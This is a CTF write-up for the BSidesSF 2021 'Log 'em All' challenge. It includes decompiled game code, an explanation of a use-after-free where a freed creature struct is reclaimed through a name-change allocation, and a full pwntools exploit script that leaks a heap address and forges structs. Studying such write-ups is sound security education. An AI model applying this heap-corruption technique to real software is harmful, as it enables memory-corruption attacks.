# Log 'em All (967 points)
> Play to win and log 'em all! Once you've seen all 151 Asciimon, talk to Professor Jack for the flag. We've included some data for the first couple rooms, you'll have to figure out the rest yourself!
>
> `nc -v logemall-a2db138b.challenges.bsidessf.net 666`
>
> *(author: iagox86)*

There are two files that accompanies the challenge. The binary itself `logemall` and some sample data in `sample.tar.bz2`.

## The task
The `logemall` game is awsome. You connect with a shell using the command given in the description and is then able to walk on maps, go to NPC's and interact with them.

The game starts by asking what you would like to be called and which Asciimon to start with. After that, a map is shown. See below:

![start of game](game.gif)

Walking to the professor gives the task:

> "So, I'm working on a project, but I need you to log all 151
Asciimon found in the wild. Well, some are in the wild. I'm not sure
where you'll find the others. But I'm sure you can do it!

So we need to log all Asciimons. He also its that not all may exist.

# Writeup
I (*foens*) attended *BSidesSF 2021 CTF* with the team *kalmarunionen*.

By the end of the event I had reverse engineered the complete binary, but had not found any vulnerabilities. A hint had also been posted:

> figure out the hidden command to view the encounters table, turn it on, and capture a bunch of Asciimon in the same area. Can you break something?

At the time I had already found the hidden commands:

- `encounters off`. Disables encounters.
- `encounters on`. Enables encounters.
- `encounters show`. Shows the possible encounters for the current map.
- `encounters hide`. Hides the encounters again.
- `fly <arg>` with `<arg>` being one of: `jade`, `deepblue`, `scarlet`, `teal`, `colour`, `gray` or `orange`. Immediatly changes the map.
- `fight` causes an encounter to happen immediatly with on of the possible encounters for the current map.

I had looked into the logic of fighting, but had been focusing on buffer overflows. The vulnerability was something else: Look at my reverse engieneered code and see if you can find it:

```c++

void DoFight_00402c3c(Encounters *encounters,PlayerInfo *playerInfo,AsciimonIndex *index,
                     int someBool)

{
  char *pcVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  undefined8 modifier;
  char local_60 [8];
  int local_58;
  uint dmg;
  int fightAction;
  uint local_4c;
  Asciimon *own;
  int modifierId;
  Asciimon *enemy;
  int local_2c;
  uint local_28;
  int local_24;
  uint ownHealth;
  uint enemyHealth;
  
  if ((someBool != 0) || (iVar2 = rand(), iVar2 % 100 <= encounters->chanceOfEncounter_0x4)) {
    iVar2 = rand();
    enemy = encounters->encounter_asciimons[iVar2 % encounters->encounters_0x0];
    modifierId = rand();
    modifierId = modifierId % 5;
    own = playerInfo->asciimon;
    ShowTerminalHint_0040521a();
    pcVar1 = enemy->name_0x4;
    modifier = getModifier_0040280e(modifierId);
    printf("A %s %s draws near!\n",modifier,pcVar1);
    iVar2 = IsCaught_0040513f(index,enemy->id_0x0);
    if (iVar2 == 0) {
      printf("    Wow! You haven\'t seen a %s before! You make a note\n");
      putchar('\n');
      SetAsciimonAsCaught_004050fd(index,enemy->id_0x0);
    }
    printf("Your %s gets ready!\n",own->name_0x4);
    putchar('\n');
    enemyHealth = enemy->hp_0x24;
    ownHealth = own->hp_0x24;
    local_24 = 0;
    while (0 < (int)enemyHealth) {
      SmallWait_00405257();
      printf("Enemy %s:\n",enemy->name_0x4);
      print_asciimon_004035f5(enemy,1);
      printf("%d/%d\n\n",(ulong)enemyHealth,(ulong)(uint)enemy->hp_0x24);
      printf("Your %s:\n",own->name_0x4);
      print_asciimon_004035f5(own,1);
      printf("%d/%d\n\n",(ulong)ownHealth,(ulong)(uint)own->hp_0x24);
      iVar2 = rand();
      iVar3 = FUN_00402874(modifierId);
      local_4c = (uint)(iVar2 % 100 < iVar3);
      local_2c = enemy->defense_0x2c;
      if (local_4c == 0) {
        printf("The enemy %s steels itself to defend!\n",enemy->name_0x4);
        local_2c = local_2c << 1;
      }
      else {
        local_28 = FUN_00402ba2((double)enemy->attack_0x28,(double)own->defense_0x2c);
        printf("The enemy %s starts winding up an attack for %d damage!\n",enemy->name_0x4,
               (ulong)local_28);
      }
      putchar('\n');
      printf("What do you do? (a = attack, d = defend, r = run)\n\n> ");
      fflush(stdout);
      fightAction = GetFightAction_004026c2();
      if (fightAction == 0) {
        uVar4 = rand();
        if ((uVar4 & 0xff) == 0) {
          puts("Whiff! You somehow missed!");
        }
        else {
          dmg = FUN_00402ba2((double)own->attack_0x28,(double)local_2c);
          printf("You attack for %d damage!\n",(ulong)dmg);
          if ((int)enemyHealth <= (int)dmg) break;
          enemyHealth = enemyHealth - dmg;
        }
        local_24 = 0;
LAB_00403134:
        if (local_4c == 0) {
          printf("The %s is defending!\n",enemy->name_0x4);
        }
        else {
          printf("The enemy hits you for %d damage!\n",(ulong)local_28);
          if ((int)ownHealth <= (int)local_28) {
            puts("Your companion faints. Game over! :(\n");
                    /* WARNING: Subroutine does not return */
            exit(0);
          }
          ownHealth = ownHealth - local_28;
        }
      }
      else {
        if (fightAction == 1) {
          puts("You defend!");
          local_28 = FUN_00402ba2((double)enemy->attack_0x28,(double)(own->defense_0x2c * 2));
          printf("The enemy ends up doing %d damage\n",(ulong)local_28);
          goto LAB_00403134;
        }
        if (fightAction == 2) {
          if (enemy->speed_0x30 < own->speed_0x30) {
            puts("You got away!");
            SmallWait_00405257();
            return;
          }
          local_24 = local_24 + 1;
          local_58 = (int)((double)(own->speed_0x30 << 5) / ((double)enemy->speed_0x30 / 4.0) +
                          (double)(local_24 * 0x1e));
          iVar2 = rand();
          uVar4 = (uint)(iVar2 >> 0x1f) >> 0x18;
          if ((int)((iVar2 + uVar4 & 0xff) - uVar4) < local_58) {
            puts("You got away!");
            SmallWait_00405257();
            return;
          }
          puts("You try to escape but fail!");
          goto LAB_00403134;
        }
        if (fightAction == 3) {
          puts("This is the combat interface!");
          putchar('\n');
          puts(
              "(A)ttack: Your companion will attack the opponent using his attack trait againsttheir defense"
              );
          puts("(D)efend: Your companion will defend itself, effectively doubling its defensetrait"
              );
          puts(
              "(R)un: You will attempt to escape; success rate is based on comparing your speedstat to theirs"
              );
          puts("(Q)uit: Exit the game");
          puts("(H)elp: Hi");
          putchar('\n');
          goto LAB_00403134;
        }
        if (fightAction == 4) {
          puts("Bye!");
                    /* WARNING: Subroutine does not return */
          exit(0);
        }
        puts("You twiddle your thumbs");
      }
    }
    SmallWait_00405257();
    printf("The enemy\'s %s faints! You are victorious!\n\n",enemy->name_0x4);
    printf("Would you to replace your %s? [y/N]\n\n",own->name_0x4);
    fgets(local_60,8,stdin);
    if (local_60[0] == 'y') {
      playerInfo->asciimon = enemy;
      enemy->isUsedByPlaner_0x34 = 1;
      free(own);
    }
  }
```

After the event ended, someone hinted that there was a `use-after-free` vulnerability.

Each map contains a list of possible encounters, each being an Asciimon. When seeing a new Asciimon, you note it down. Thus, to `log` all Asciimons, we just have to meet them. When having faught and won over an Asciimon, you are asked if you whish to replace your current on with the one you just won over.

That seems all valid. However, if you exchange your Asciimon, then the one you just faught over **is still a valid encounter**! You can thus fight it **again** and this time the `free(own)` call will free the one you are now using. Thus, the `playerInfo->asciimon` now points to a free'd memory region.

Great. So we have found a vulnerability. What to do with it? Well, lets *Log 'em All*! :)

Each Ascsiimon is malloc'ed with a size of `0x40`. There is an `official Name Rater`. He rates your name, but he also allows you to change it:

```c++
void nameRater_00404472(PlayerInfo *playerIInfo)

{
  int iVar1;
  char *newName;
  char *pcVar2;
  size_t sVar3;
  
  ShowTerminalHint_0040521a();
  puts("A weird man stands here...");
  putchar('\n');
  puts("\"Hello, hello! I am the official Name Rater! Want me to rate your nickname?\"");
  putchar('\n');
  puts("(You have a weird feeling this isn\'t how it normally works...");
  putchar('\n');
  iVar1 = promt_00405272("Would you like him to rate your name?",1);
  ShowTerminalHint_0040521a();
  if (iVar1 == 0) {
    puts("He replies:");
    putchar('\n');
    puts("\"Fine! Come anytime you like!\"");
  }
  else {
    printf("\"%s, is it? That is a decent nickname! But, would you like meto\n",playerIInfo->name);
    puts("give you a nicer nickname? How about it?\"");
    putchar('\n');
    iVar1 = promt_00405272("What do you answer?",1);
    ShowTerminalHint_0040521a();
    if (iVar1 == 0) {
      puts("\"Fine! Come anytime you like!\"");
    }
    else {
      puts("\"Fine! What would you like your nickname to be?\"");
      putchar('\n');
      printf("> ");
      newName = (char *)malloc(0x40);
      memset(newName,0,0x40);
      pcVar2 = fgets(newName,0x3f,stdin);
      if (pcVar2 == (char *)0x0) {
        puts("Could not read from stdin");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      sVar3 = strlen(newName);
      if (newName[sVar3 - 1] == '\n') {
        sVar3 = strlen(newName);
        newName[sVar3 - 1] = '\0';
      }
      printf("\"So you want to change \'%s\' to \'%s\'?\"\n",playerIInfo->name,newName);
      iVar1 = promt_00405272("Is that right?",1);
      ShowTerminalHint_0040521a();
      if (iVar1 == 0) {
        printf("\"OK! You\'re still %s!\"\n",playerIInfo->name);
        free(newName);
      }
      else {
        free(playerIInfo->name);
        playerIInfo->name = newName;
        printf("\"OK! From now on, you\'ll be called %s! That\'s a better name than before!\"\n",
               playerIInfo->name);
      }
    }
  }
  return;
}
```

Notice that the name is also malloc'ed with a size of `0x40`. The data is read using `fgets`, so we can also add `null` bytes. Great. We can thus go to the name rater and change your name, the name will be filled into the same area that the Asciimon had, we can now control the Asciimon definition.

I have reverse engineered the Asciimon struct to be:

```c++
struct Asciimon {
    int id_0x0;
    char name_0x4[32];
    int hp_0x24;
    int attack_0x28;
    int defense_0x2c;
    int speed_0x30;
    int isUsedByPlayer_0x34;        <!----- This is set to 1 when we win a fight
    char* asciiart_0x38;
};
```

Our deviced attack plan is then to:

1. Go next to the name rater.
2. Fight and exchange the same Asciimon on the map.
3. Change the name through the name rater such that the ID of the asciimon is changed.
4. Fight the now changed Asciimon
5. Keep doing step 3 and 4 until all 152 Asciimons are logged!

This was my first plan. However, it always failed when I reached the 10th Asciimon. I figured out that `0x10` is `\n` and `fgets` only reads until it reaches a newline. Hmm. I walked around in the game and found a map where it could be found in the wild. Thus, the plan is now to log all the other Asciimons using the trick above, but log the 10th Asciimon, the *Caterpillar*, in the wild.

This is what the attack does:

```python
#!/usr/bin/env python3
from pwn import *

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = remote('logemall-a2db138b.challenges.bsidessf.net', 666)

PRINT = args.PRINT

def recvuntil(s, drop=False):
    d = io.recvuntil(s, drop=drop)
    if PRINT:
        print(d.decode('ascii', 'ignore'))
    return d

def execute_command(c):
    io.info('sending %s' % c)
    recvuntil('Action > ')
    io.sendline(c)

def execute_x(direction, steps):
    for x in range(0, steps):
        execute_command(direction)

def go_left(steps):
    execute_x('a', steps)

def go_right(steps):
    execute_x('d', steps)

def go_down(steps):
    execute_x('s', steps)

def go_up(steps):
    execute_x('w', steps)

def confirm_yn():
    io.info('confirm')
    recvuntil((b'[y/N]', b'[Y/n]'))
    io.sendline('y')

def press_enter_to_continue():
    io.info('enter to continue')
    recvuntil('to continue>')
    io.sendline('')

def fly(map):
    execute_command('fly ' + map)

def fight(expected_enemy):
    execute_command('fight')
    data = recvuntil('gets ready!')
    assert expected_enemy.encode() in data, "%s not in %s" % (expected_enemy, data)
    press_enter_to_continue()

def attack_until_win_and_exchange_pokemon():
    while True:
        execute_command('a')
        press_enter_to_continue()
        data = io.recvlines(4)
        if PRINT:
            print((b"\n".join(data)).decode('ascii', 'ignore'))
        if "victorious!".encode() in data[3]:
            confirm_yn()
            return

def attack(steps):
    for x in range(0, steps):
        execute_command('a')
        press_enter_to_continue()

def get_heap_address_from_companion():
    recvuntil('Companion: \n[')
    data = recvuntil(']', drop=True)
    heap_address = int(data)
    success('Heap address: %d' % heap_address)
    return heap_address

def change_name_to(new_name):
    info('Changing name to %s' % new_name)
    assert b'\n' not in new_name, new_name
    assert b'\x0A' not in new_name, new_name
    assert len(new_name) <= 0x3F or (len(new_name) == 0x40 and new_name[0x3F] == 0), len(new_name)
    go_left(1)
    recvuntil('A weird man stands here...')
    recvuntil('Would you like him to rate your name?')
    confirm_yn()
    recvuntil('is it? That is a decent nickname!')
    recvuntil('give you a nicer nickname? How about it?')
    confirm_yn()
    recvuntil('Fine! What would you like your nickname to be?')
    recvuntil('>')
    io.sendline(new_name)
    recvuntil('So you want to change')
    confirm_yn()
    recvuntil('a better name than before!')

def run_until_successfully_escaped():
    has_escaped = False
    while not has_escaped:
        execute_command('run')
        has_escaped = b'You got away!' in io.recvuntil((b'You try to escape but fail!', b'You got away!'))
        press_enter_to_continue()


def start_fights_until_escaped_from(enemy_name):
    info('Starting fight until escaped from %s' % enemy_name)
    has_met_asciimon = False
    while not has_met_asciimon:
        execute_command('fight')
        press_enter_to_continue()
        data = recvuntil('(Hint: press <enter> to re-run previous command)')
        has_met_asciimon = b'Enemy ' + enemy_name in data
        run_until_successfully_escaped()


try:
    # Choose name
    io.sendlineafter('> ', 'foens')

    # Choose starting pokemon
    io.sendlineafter('Choices: Plant Frog, Fire Lizard, Water Turtle\n', 'Plant Frog')
    confirm_yn()

    # Use hidden commands
    execute_command('encounters show')
    execute_command('encounters off')

    # Go next to the name rater
    go_left(7)
    press_enter_to_continue()  # Open door
    go_left(3)
    fly('deepblue')
    go_down(6)
    go_left(1)

    # Fight, win and exchange 'Pitcher Plant' two times
    # This creates a use-after-free situtation
    fight('Enraged Pony draws near')  # Not the pokemon we want to fight
    execute_command('run')
    press_enter_to_continue()  # ran away
    fight('A Normal Pitcher Plant')
    attack_until_win_and_exchange_pokemon()
    fight('A Timid Pitcher Plant')
    attack_until_win_and_exchange_pokemon()
    # At this point, the 'Pitcher Plant' is being used, but is also freed.
    # Asciimons has been malloced using malloc(0x40)
    # When talking to the name rater, you can change your name.
    # This will malloc(0x40) for your name. Perfect match!

    # We are now in a used after free. We can get a heap pointer
    # by looking at the ID of our pokemon.
    # It contains the first 4 bytes of a the heap free-list pointer
    # The last 4 bytes are assumed zero
    heap_addr = get_heap_address_from_companion()

    # Change name to create a pokemon of id 'x'
    # Start a fight and run from it, such that we have seen it
    for x in range(1, 152):
        # Argh 'Caterpillar' with id '10' will end up trying
        # to change its name to '\n' which will stop
        # the reading of the name!
        # However, the pokemon can be found in Veridian Forest.
        # Fastest way to get there: 'fly gray', go down
        # Veridian Forest

        if x == 10:  # Cannot handle '\n' for the 'Caterpillar'
            continue
        asciimon_name = str(x).encode()
        while len(asciimon_name) < 31:
            asciimon_name += b'A'
        hp = 10000
        attack = 1
        defence = 1000
        speed = 1000
        is_used_by_player = 1  # Must be set to one, or asciiart is free'd when map is changed
                               # which causes a crash
        # An Asciimon looks like this:
        # struct Asciimon {
        #     int id_0x0;
        #     char name_0x4[32];
        #     int hp_0x24;
        #     int attack_0x28;
        #     int defense_0x2c;
        #     int speed_0x30;
        #     int isUsedByPlayer_0x34;        <!----- This is set to 1 when we win a fight
        #     char* asciiart_0x38;
        # };
        new_name = (p32(x) + asciimon_name + b'\x00' + p32(hp) + p32(attack) + p32(defence)
                    + p32(speed) + p32(is_used_by_player) + p64(heap_addr))

        change_name_to(new_name)
        start_fights_until_escaped_from(asciimon_name)
        change_name_to(new_name)  # Because of the ordering of free/malloc, we need to change the name again

    # Now lets find that Caterpillar
    fly('gray')
    go_down(3)
    go_left(6)
    go_down(6)
    start_fights_until_escaped_from(b'Caterpillar')

    # Get back to the professor to get the flag
    go_up(5)
    fly('colour')
    go_right(16)
    go_up(3)

    # Step through first conversation with the professor
    press_enter_to_continue()
    press_enter_to_continue()
    press_enter_to_continue()
    press_enter_to_continue()
    press_enter_to_continue()

    # Go to the professor again
    PRINT = True  # Lets print output from now
    go_up(1)
    press_enter_to_continue()


except KeyboardInterrupt:  # CTRL+C anytime to escape to interactive
    pass

io.interactive()
```

The attack took ~18 mins to conduct. I have made a small video showing it, where I have increased the playback speed of step 3 and 4 by a factor of `50`. I exchanged my Asciimon with a `Pitcher Plant`

![solution](solution.gif)

Got the flag: `CTF{remember_cinnabar}`

The performance of the attack could probably be increased. The game uses random numberse, but the seed is known. This could probably be used such that the script did not have to wait for responses, since they would already be known.

All in all, a very cool programmed game and a nice challenge. Kudos to *iagox86*!
